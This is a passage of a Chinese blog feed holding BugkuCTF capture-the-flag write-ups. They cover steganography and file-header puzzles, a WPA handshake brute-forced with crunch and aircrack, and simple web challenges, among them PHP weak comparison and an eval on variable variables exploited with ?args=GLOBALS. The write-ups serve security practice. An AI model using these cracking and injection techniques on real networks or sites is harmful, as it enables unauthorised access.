src="https://img-blog.csdnimg.cn/2020110919192734.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述">（6）查看图片，发现有两张图片携带了flag信息，但同样的部分却被遮挡住了<br><img src="https://img-blog.csdnimg.cn/20201109192108944.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>（7）原图片中一定还有隐藏的信息，继续在notepad++中查看，发现了一串特殊的二进制字符。<br><img src="https://img-blog.csdnimg.cn/20201109192727587.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述">（8）将这串二进制字符转换成字符串<br><img src="https://img-blog.csdnimg.cn/20201109192823812.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述">（9）得到mynameiskey!!!hhh，意思是“我的名字是密码”，应该还存在加密文件<br><img src="https://img-blog.csdnimg.cn/2020110919341721.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（10）7z压缩包的文件头是37 7A BC AF 27 1C，与这串二进制后面的数字很像，将其改为7z压缩包的文件头，放到kali下binwalk一下<br><img src="https://img-blog.csdnimg.cn/20201109193651596.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>（11）确实存在一个7z的压缩包，用foremost分离文件，但奇怪的是这里我分离不出来。可以直接把原图片的后缀名改为.7z，解压<br><img src="https://img-blog.csdnimg.cn/20201109200530480.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>（12）依旧是一张图片，依旧修改图片尺寸<br><img src="https://img-blog.csdnimg.cn/20201109200600834.png#pic_center" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20201109201400718.png#pic_center" alt="在这里插入图片描述"></p><p>（13）结合之前获得的flag信息，用base16解码，得到flag<br><img src="https://img-blog.csdnimg.cn/20201109201554314.png#pic_center" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/2020110920162984.png#pic_center" alt="在这里插入图片描述"></p><h2 id="图穷匕见"><a href="#图穷匕见" class="headerlink" title="图穷匕见"></a>图穷匕见</h2><p>（1）下载附件，是一张.jpg图片，binwalk一下，没发现flag信息。放到notepad++下，搜索图片结尾ff d9，在图片后面发现了一大串的特殊的数字。<br><img src="https://img-blog.csdnimg.cn/2020110923262426.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述">（2）该串数字为16进制，将其转换为ASCII码，内容为一串坐标<br><img src="https://img-blog.csdnimg.cn/20201109232859612.png#pic_center" alt="在这里插入图片描述"></p><p>（3）放到记事本里，在“编辑”里选择“替换”，将(,)全部替换为空<br><img src="https://img-blog.csdnimg.cn/20201109233050561.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20201109233124704.png#pic_center" alt="在这里插入图片描述"></p><p>（4）保存后放到kali下，这里需要使用gnuplot工具</p><pre><code>atp-get install gnuplot            //安装gnuplot工具</code></pre><p><img src="https://img-blog.csdnimg.cn/20201109233437618.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>（5）得到一张二维码图片，扫描后得到flag<br><img src="https://img-blog.csdnimg.cn/20201109233517131.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20201109233642751.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="convert"><a href="#convert" class="headerlink" title="convert"></a>convert</h2><p>（1）打开链接，是一大串二进制数字，编写代码，将其转换为八位一组，这里我用的C语言</p><pre><code class="c">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&#123;    char a[]=&quot;输入这串二进制数字&quot;    int i=0;    char *p=a;    while(*p!=&#39;\0&#39;)&#123;        if(i%8==0)&#123;            if(i == 0)&#123;                printf(&quot;%c&quot;,*p);            &#125;            else&#123;                printf(&quot; %c&quot;,*p);            &#125;        &#125;        if(i%8!=0)&#123;            printf(&quot;%c&quot;,*p);        &#125;        i++;        p++;    &#125;    system(&quot;pause&quot;);    return 0;&#125; </code></pre><p>使用在线工具将其转换为十六进制。<a href="http://ctf.ssleye.com/jinzhi.html">http://ctf.ssleye.com/jinzhi.html</a><br><img src="https://img-blog.csdnimg.cn/20201114141308684.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2020111414134873.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（2）发现十六进制的开头为52 61 72 21，显然是一个rar的压缩包。将这串十六进制数保存在一个文本文档里，用010 editor导入十六进制，另存为3.rar<br><img src="https://img-blog.csdnimg.cn/20201114141622184.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（3）解压后得到一张图片，查看其属性，在详细信息中发现一串base64加密的字符，解密后得到flag。<br><img src="https://img-blog.csdnimg.cn/20201114141742641.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201114141801436.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> BugkuCTF_杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BugkuCTF_Misc_004</title>
      <link href="2020/11/15/BugkuCTF/BugkuCTF_Misc-004/"/>
      <url>2020/11/15/BugkuCTF/BugkuCTF_Misc-004/</url>
      
        <content type="html"><![CDATA[<h2 id="猫片-安恒"><a href="#猫片-安恒" class="headerlink" title="猫片(安恒)"></a>猫片(安恒)</h2><p>（1）将下载的文件后缀名改为png（注：png正常文件头：89 50 4E 47）<br><img src="https://img-blog.csdnimg.cn/20201031123855768.png#pic_center" alt="在这里插入图片描述"><br>（2）根据提示LSB和BGR，用stegsolve工具打开，发现一张png图片<br><img src="https://img-blog.csdnimg.cn/20201031124027360.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（2）将其保存下来，并修改后缀名为.png，但无法打开。用notepad++打开，发现文件头错误<br><img src="https://img-blog.csdnimg.cn/20201031124313322.png#pic_center" alt="在这里插入图片描述"><br>（3）将前面的ff fe删掉并保存，打开图片，是半张二维码<br><img src="https://img-blog.csdnimg.cn/2020103112441746.png#pic_center" alt="在这里插入图片描述"><br>（4）修改图片高度试试，改为和长度一样。<br><img src="https://img-blog.csdnimg.cn/2020103112542257.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201031125455519.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201031125506356.png#pic_center" alt="在这里插入图片描述"><br>（5）看到了完整的二维码，但和正常的有些不一样，中间的正方形应为黑色。用画图工具反色一下（新建–&gt;粘贴来源–&gt;右键–反色–&gt;裁剪）<br><img src="https://img-blog.csdnimg.cn/20201031130018412.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201031130038164.png#pic_center" alt="在这里插入图片描述"><br>（6）扫描器扫描，得到一个网址，是一个百度云链接<br><img src="https://img-blog.csdnimg.cn/20201031130224341.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2020103113034095.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（7）下载下来后，是一个rar压缩包，但解压时出现了问题，可以用WinRAR打开<br><img src="https://img-blog.csdnimg.cn/20201031130626811.png#pic_center" alt="在这里插入图片描述"><br>（8）不过依然得到一个flag.txt文件<br><img src="https://img-blog.csdnimg.cn/20201031130758999.png#pic_center" alt="在这里插入图片描述"><br>（9）根据hint里的提示“NTFS”,用NtfsStreamsEditor查看数据流，然后导出。<br>#flag.rar这个压缩文件一定要用winrar来解压才能找得到数据流。<br><img src="https://img-blog.csdnimg.cn/2020103122191832.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（10）一个.pyc文件，放到在线工具<a href="https://tool.lu/pyc/">https://tool.lu/pyc/</a><br><img src="https://img-blog.csdnimg.cn/20201031133154759.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（11）根据这个加密脚本，再写一个解密脚本</p><pre><code>def decode():    ciphertext = [    &#39;96&#39;,    &#39;65&#39;,    &#39;93&#39;,    &#39;123&#39;,    &#39;91&#39;,    &#39;97&#39;,    &#39;22&#39;,    &#39;93&#39;,    &#39;70&#39;,    &#39;102&#39;,    &#39;94&#39;,    &#39;132&#39;,    &#39;46&#39;,    &#39;112&#39;,    &#39;64&#39;,    &#39;97&#39;,    &#39;88&#39;,    &#39;80&#39;,    &#39;82&#39;,    &#39;137&#39;,    &#39;90&#39;,    &#39;109&#39;,    &#39;99&#39;,    &#39;112&#39;]    ciphertext.reverse()    flag = &#39;&#39;    for i in range(len(ciphertext)):        if i % 2 == 0:            s = int(ciphertext[i]) - 10        else:            s = int(ciphertext[i]) + 10        s=chr(i^s)        flag += s    return flagdef main():    flag = decode()    print(flag)if __name__ == &#39;__main__&#39;:    main()</code></pre><p>（12）用代码在线工具执行一下<a href="https://tool.lu/coderunner/">https://tool.lu/coderunner/</a><br><img src="https://img-blog.csdnimg.cn/20201031133531810.png#pic_center" alt="在这里插入图片描述"></p><h2 id="多彩"><a href="#多彩" class="headerlink" title="多彩"></a>多彩</h2><p>（1）得到一张.png的图片,在notepad++里没有发现有用信息<br><img src="https://img-blog.csdnimg.cn/20201031162838777.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（2）放到stegsolve里分析，发现了图片中隐藏的数据，是一个压缩包，将其抽取出来<br><img src="https://img-blog.csdnimg.cn/20201031163106844.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（3）先用notepad++打开这个压缩包，删掉文件头前面的东西，然后保存<br><img src="https://img-blog.csdnimg.cn/20201031163401174.png#pic_center" alt="在这里插入图片描述"><br>（4）把后缀名改为zip，解压，但出错了，后缀名改为.rar也是这样（不执行第3步也会出错）<br><img src="https://img-blog.csdnimg.cn/20201101120011595.png#pic_center" alt="在这里插入图片描述"></p><p>（5）看了一些大佬的writeup，压缩文件是加密的，需要用到图片中的色号。但我这里直接显示出错，没让我输入密码。后面就不会做了。（嘤嘤嘤）</p><pre><code>1,27,59,11,23,7,57,1,1,76,222,1,1,50,214,6,77,50,53,214,6</code></pre><h2 id="旋转跳跃"><a href="#旋转跳跃" class="headerlink" title="旋转跳跃"></a>旋转跳跃</h2><p><img src="https://img-blog.csdnimg.cn/20201101114352899.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>（1）附件是一个音频文件，使用工具MP3Stego来对音频进行解码。将该音频文件拷贝到MP3Stego目录下，在目录栏里输入cmd打开运行窗口。输入如下命令解码</p><pre><code>Decode.exe -X -P syclovergeek sycgeek-mp3.mp3          //-P后面即为题目提示的密码</code></pre><p><img src="https://img-blog.csdnimg.cn/20201101114808149.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述">（2）解码完后，在MP3Stego目录下多了一个sycgeek-mp3.mp3.txt文件，打开即可看到flag。<br><img src="https://img-blog.csdnimg.cn/20201101114920512.png#pic_center" alt="在这里插入图片描述"></p><h2 id="普通的二维码"><a href="#普通的二维码" class="headerlink" title="普通的二维码"></a>普通的二维码</h2><p>（1）下载附件，得到一张二维码，扫描后没有flag。用notepad++打开看看<br><img src="https://img-blog.csdnimg.cn/20201104224511217.png#pic_center" alt="在这里插入图片描述">（2）在最后发现一串数字，想到ASCII码，146作为八进制时对应的是f。然后把这串数字转换成对应的字符，得到flag。<br><img src="https://img-blog.csdnimg.cn/20201104224835832.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> BugkuCTF_杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BugkuCTF_Web_001</title>
      <link href="2020/11/15/BugkuCTF/BugkuCTF_Web-001/"/>
      <url>2020/11/15/BugkuCTF/BugkuCTF_Web-001/</url>
      
        <content type="html"><![CDATA[<h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>直接在URL前加“view-source:”，查看源代码，发现flag</p><h2 id="计算器"><a href="#计算器" class="headerlink" title="计算器"></a>计算器</h2><p>（1）打开网址，是计算两个数的和，但结果只能输入一位数字。<br><img src="https://img-blog.csdnimg.cn/20201031181135297.png#pic_center" alt="在这里插入图片描述">（2）查看源代码<br><img src="https://img-blog.csdnimg.cn/20201031181300527.png#pic_center" alt="在这里插入图片描述">（3）指出了字符串的最大长度为1，直接修改这个最大长度，只要改为比结果的位数大就行<br><img src="https://img-blog.csdnimg.cn/20201031181506727.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>（4）然后计算出正确的结果就能得到flag<br><img src="https://img-blog.csdnimg.cn/20201031181616802.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="web基础-GET"><a href="#web基础-GET" class="headerlink" title="web基础$_GET"></a>web基础$_GET</h2><p>用get方法输入一个参数，参数名为“what”，值为“flag”<br>?用来间隔URL和请求参数，若要输入多个参数，用&amp;间隔。<br><img src="https://img-blog.csdnimg.cn/20201031182115891.png#pic_center" alt="在这里插入图片描述"></p><h2 id="web基础-POST"><a href="#web基础-POST" class="headerlink" title="web基础$_POST"></a>web基础$_POST</h2><p>用post方法输入一个参数，借助hackbar工具，传一个what参数，值为flag<br><img src="https://img-blog.csdnimg.cn/20201031182732284.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"> </p><h2 id="矛盾"><a href="#矛盾" class="headerlink" title="矛盾"></a>矛盾</h2><p>（1）一串php代码<br><img src="https://img-blog.csdnimg.cn/20201031184550585.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>（2）用get方法传入一个num参数，其不能为数字，但又要等于1。这里涉及php代码弱类型比较，数字和字符混合的字符串转换为整数后只保留数字部分。所以num可以构造为1xiaosong，字符部分随便。<br><img src="https://img-blog.csdnimg.cn/20201031185112888.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>#<img src="https://img-blog.csdnimg.cn/20201031185229655.png#pic_center" alt="在这里插入图片描述"></p><h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p>（1）打开网址，一直是重复的页面<br><img src="https://img-blog.csdnimg.cn/20201031185735566.png#pic_center" alt="在这里插入图片描述">（2）用view-source:查看源代码，在最下面发现一串unicode编码<br><img src="https://img-blog.csdnimg.cn/20201031185849413.png#pic_center" alt="在这里插入图片描述">（3）用在线工具转为ASCII码得到flag ( <a href="http://tool.chinaz.com/tools/unicode.aspx">http://tool.chinaz.com/tools/unicode.aspx</a>)<br><img src="https://img-blog.csdnimg.cn/2020103118594657.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h2><p><img src="https://img-blog.csdnimg.cn/20201031191427635.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>（1）根据题目的意思，将域名flag.baidu.com指向到IP地址123.206.87.240<br>windows平台在C:\Windows\System32\drivers\etc\host中最后一行加入120.24.86.145 flag.bugku.com  （这里用notepad++打开host文件，修改后保存）<br><img src="https://img-blog.csdnimg.cn/20201031192314845.png#pic_center" alt="在这里插入图片描述"></p><p>（2）修改完后，打开浏览器访问flag.baidu.com，得到flag<br><img src="https://img-blog.csdnimg.cn/20201031192355246.png#pic_center" alt="在这里插入图片描述"></p><p>#如果是linux平台，则在/etc/host中加入123.206.87.240   flag.baidu.com </p><h2 id="你必须让他停下"><a href="#你必须让他停下" class="headerlink" title="你必须让他停下"></a>你必须让他停下</h2><p>（1）打开网址，页面一直刷新，用burp抓包<br><img src="https://img-blog.csdnimg.cn/20201031194439430.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>（2）发送到Repeater，点击发送，每发送一次，图片都会来一次变化，这是随机的，不断地发送，在出现10.jpg的时候发现了flag<br><img src="https://img-blog.csdnimg.cn/20201031194748327.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="变量1"><a href="#变量1" class="headerlink" title="变量1"></a>变量1</h2><p>（1）打开网址，发现一段php代码<br><img src="https://img-blog.csdnimg.cn/20201101173036596.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>（2）对代码的解释：</p><pre><code>&lt;?php  error_reporting(0);                            //关闭php错误显示include &quot;flag1.php&quot;;                           //引入flag1.php文件代码highlight_file(__file__);if(isset($_GET[&#39;args&#39;]))&#123;                     //通过get方式传递 args变量才能执行if里面的代码    $args = $_GET[&#39;args&#39;];    if(!preg_match(&quot;/^\w+$/&quot;,$args))&#123;    //正则表达式的意思是匹配任意[A-Z,a-z，0-9,_]的字符，就是任意大小写字母和0-9以及下划线组成        die(&quot;args error!&quot;);    &#125;    eval(&quot;var_dump($$args);&quot;);&#125;?&gt;</code></pre><p>（3）可变变量(<a href="https://www.php.net/manual/zh/language.variables.variable.php">https://www.php.net/manual/zh/language.variables.variable.php</a>)<br>#一个变量的变量名可以动态的设置和使用。一个普通的变量通过声明来设置，例如： </p><pre><code>&lt;?php$a = &#39;hello&#39;;?&gt;</code></pre><p>#一个可变变量获取了一个普通变量的值作为这个可变变量的变量名。例如：</p><pre><code>&lt;?php$$a = &#39;world&#39;;?&gt;</code></pre><p>#这时，两个变量都被定义了：$a 的内容是“hello”并且 $hello 的内容是“world”。因此，以下语句： </p><pre><code>&lt;?phpecho &quot;$a $&#123;$a&#125;&quot;;?&gt;</code></pre><p>与以下语句输出完全相同的结果,都会输出hello world： </p><pre><code>&lt;?phpecho &quot;$a $hello&quot;;?&gt;</code></pre><p>#要将可变变量用于数组，必须解决一个模棱两可的问题。这就是当写下$$a[1] 时，解析器需要知道是想要 $a[1] 作为一个变量呢，还是想要 $$a 作为一个变量并取出该变量中索引为 [1] 的值。解决此问题的语法是，对第一种情况用 ${$a[1]}，对第二种情况用 ${$a}[1]。 </p><p>#在 PHP 的函数和类的方法中，超全局变量不能用作可变变量。$this 变量也是一个特殊变量，不能被动态引用。 </p><p>（4）超全局变量是在全部作用域中始终可用的内置变量<br>这些超全局变量是：</p><pre><code>    $GLOBALS    $_SERVER    $_GET    $_POST    $_FILES    $_COOKIE    $_SESSION    $_REQUEST    $_ENV</code></pre><p>（5）所以只需给变量传入一个全局变量就可以了，将其变量名传入。构造参数：?args=GLOBALS，就能得到flag。<br><img src="https://img-blog.csdnimg.cn/20201101175938899.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><p><img src="https://img-blog.csdnimg.cn/20201101184046587.png#pic_center" alt="在这里插入图片描述"></p><p>（1）查看网页源代码，发现一串特殊的字符<br><img src="https://img-blog.csdnimg.cn/20201101184313987.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述">（2）根据题目的提示，JSFuck是用6个字符 [ ] ( ) ! +来编写JavaScript程序。将源代码中的特殊字符放到浏览器的console控制台上进行解密。粘贴到控制台后按回车即可。<br><img src="https://img-blog.csdnimg.cn/20201101184717920.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述">（3）注意提交格式，要求大写。CTF{WHATFK}</p><p>#Jother是一种运用于javascript语言中利用少量字符构造精简的匿名函数方法对于字符串进行的编码方式。其中8个少量字符包括：[ ] ( ) ! + { }  只用这些字符就能完成对任意字符串的编码。（可以在浏览器的console控制台上直接解密）</p>]]></content>
      
      
      <categories>
          
          <category> BugkuCTF_Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BugkuCTF_Misc_003</title>
      <link href="2020/11/15/BugkuCTF/BugkuCTF_Misc-003/"/>
      <url>2020/11/15/BugkuCTF/BugkuCTF_Misc-003/</url>
      
        <content type="html"><![CDATA[<h2 id="想蹭网先解开密码"><a href="#想蹭网先解开密码" class="headerlink" title="想蹭网先解开密码"></a>想蹭网先解开密码</h2><p><img src="https://img-blog.csdnimg.cn/20201030224918563.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（1）用wireshark打开附件<br><img src="https://img-blog.csdnimg.cn/20201030224945875.png#pic_center" alt="在这里插入图片描述"><br>（2）WiFi连接认证的重点在WPA的四次握手包，即eapol协议的包，过滤一下：<br><img src="https://img-blog.csdnimg.cn/20201030225003978.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（3）根据题目，需要爆破WiFi密码，使用密码生成工具crunch生成密码字典（kali自带，无需安装）这里题目提示密码为手机号，所以设置生成11位的字符，并且给出了前7位，则只剩下4位需要破解。<br><img src="https://img-blog.csdnimg.cn/20201030225045290.png#pic_center" alt="在这里插入图片描述"><br>（4）再使用软件aircrack破解WiFi密码（kali自带，无需安装），这里选择第三3个，然后开始破解，即可看到flag。<br><img src="https://img-blog.csdnimg.cn/20201030225105113.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img 